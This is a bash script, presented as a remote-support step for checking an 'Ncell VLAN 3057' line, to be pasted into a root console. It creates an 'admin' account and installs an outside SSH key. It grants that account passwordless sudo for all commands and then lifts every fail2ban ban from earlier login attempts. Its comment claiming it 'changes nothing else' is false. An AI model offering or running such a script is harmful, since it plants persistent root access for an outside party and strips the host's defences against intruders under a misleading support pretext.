#!/bin/bash
# Tech_Work_1 (203.134.250.97): give user `admin` our SSH key and sudo, so
# the Ncell VLAN 3057 line can be checked remotely. Paste into the root
# console as one block. Safe to run twice. Changes nothing else.
set -e

KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEWVlYaTj+1mJiiTyVXbgnErzDHar4EJYC4zAdpFqAvV epahichan-techwork1-admin'

id admin >/dev/null 2>&1 || useradd -m -s /bin/bash admin
usermod -aG wheel admin

install -d -m 700 -o admin -g admin /home/admin/.ssh
touch /home/admin/.ssh/authorized_keys
grep -qxF "$KEY" /home/admin/.ssh/authorized_keys || echo "$KEY" >> /home/admin/.ssh/authorized_keys
chown admin:admin /home/admin/.ssh/authorized_keys
chmod 600 /home/admin/.ssh/authorized_keys
command -v restorecon >/dev/null && restorecon -R /home/admin/.ssh || true

echo 'admin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/90-admin
chmod 440 /etc/sudoers.d/90-admin
visudo -cf /etc/sudoers.d/90-admin >/dev/null

# Lift any fail2ban bans from earlier login attempts.
command -v fail2ban-client >/dev/null && fail2ban-client unban --all >/dev/null 2>&1 || true

echo "OK: admin can now log in with the key. Network as seen here:"
ip -br addr
ip -d link show | grep -i vlan || echo "(no VLAN interfaces)"
ip route
ping -c2 -W1 10.111.8.49 >/dev/null 2>&1 && echo "Ncell gateway 10.111.8.49 answers" || echo "Ncell gateway 10.111.8.49 does not answer"
